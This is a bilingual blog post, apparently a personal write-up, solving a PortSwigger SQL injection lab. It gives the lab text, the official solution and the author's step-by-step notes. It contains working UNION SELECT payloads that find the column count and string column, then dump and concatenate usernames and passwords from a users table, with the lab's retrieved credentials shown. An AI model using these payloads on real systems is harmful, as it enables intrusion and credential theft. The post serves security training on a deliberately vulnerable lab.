---
layout: post
title: "SQL injection UNION attack, retrieving multiple values in a single column"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---








```

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

#### Solution

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
2.  Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+NULL,'abc'--`
3.  Use the following payload to retrieve the contents of the `users` table:
    
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4.  Verify that the application's response contains usernames and passwords.






本實驗室在產品類別過濾器中包含一個 SQL 注入漏洞。查詢的結果會在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。

該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。

為了解決實驗室問題，執行 [SQL 注入 UNION](https://portswigger.net/web-security/sql-injection/union-attacks) 攻擊，檢索所有用戶名和密碼，並使用該信息以`管理員`用戶。

＃＃＃＃ 暗示

您可以在我們的 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet) 上找到一些有用的有效負載。

＃＃＃＃ 解決方案

1. 使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。
2.確定[查詢返回的列數](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)和[which列包含文本數據](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)。驗證查詢是否返回兩列，其中只有一列包含文本，在 `category` 參數中使用如下所示的有效負載：
    
    `'+UNION+SELECT+NULL,'abc'--`
3. 使用以下負載來檢索 `users` 表的內容：
    
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
4. 驗證應用程序的響應是否包含用戶名和密碼。




```


GET 請求
```
category=Lifestyle
```

如果用BP 記得用+號取帶空格，BP 不會像瀏覽器，自動轉譯。

get請求可以直接URL 改，或是使用 hack bar。

測出來需要兩欄
```
' UNION SELECT NULL--
//Internal Server Error


' UNION SELECT NULL,NULL--
//OK



```


測試各欄位是哪種型態:
```

' UNION SELECT 'aaa','bbb'--
//Internal Server Error


' UNION SELECT NULL,'bbb'--
//OK


' UNION SELECT 'aaa',NULL--
//Internal Server Error



```


測出來第2個可以使用字串。

題目:
```
該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。
為了解決實驗室問題，執行 [SQL 注入 UNION](https://portswigger.net/web-security/sql-injection/union-attacks) 攻擊，檢索所有用戶名和密碼，並使用該信息以`管理員`用戶。
```



```
' UNION SELECT NULL,'bbb'--



' UNION SELECT   NULL,username FROM users--
//carlos
//administrator
//wiener


' UNION SELECT   NULL,password FROM users--
//anznyrljyjp2zginnk4l
//ro80q53ydyefrsyp174g
//ayk0r2969qjwhv4c1q2t


```


### 這樣是可以沒錯，不過不夠屌，我們一次串接兩個欄位。

1.|| 串接符號  (Oracle 串接符號)
2.利用 ~ 格開username 和password
```

' UNION SELECT   NULL,username || '~' || password FROM users--

```

如果還不明顯可以再多加一點。

```
' UNION SELECT   NULL,username || '' || password FROM users--
```




```
carlosro80q53ydyefrsyp174g

wieneranznyrljyjp2zginnk4l

administratorayk0r2969qjwhv4c1q2t

```


登入成功


